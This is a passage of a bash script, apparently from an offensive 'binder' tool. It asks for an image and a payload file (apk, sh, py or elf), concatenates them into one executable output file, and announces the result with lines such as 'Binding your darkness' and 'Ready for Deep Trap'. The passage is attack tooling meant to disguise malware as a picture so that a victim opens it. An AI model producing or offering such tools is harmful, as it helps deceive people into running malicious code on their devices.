}
banner

echo -e "\e[36mEnter Image File (jpg/png):\e[0m"
read image
echo -e "\e[36mEnter Payload File (apk/sh/py/elf):\e[0m"
read payload
echo -e "\e[36mEnter Output File Name:\e[0m"
read output

if [[ -f "$image" && -f "$payload" ]]; then
    echo -e "\e[32mBinding your darkness... Please wait...\e[0m"
    cat "$image" "$payload" > "$output"
    chmod +x "$output"
    echo -e "\e[31m[+] Successfully Bind Image + Payload"
    echo -e "\e[33mOutput File : $output"
    echo -e "\e[32mReady for Deep Trap..."
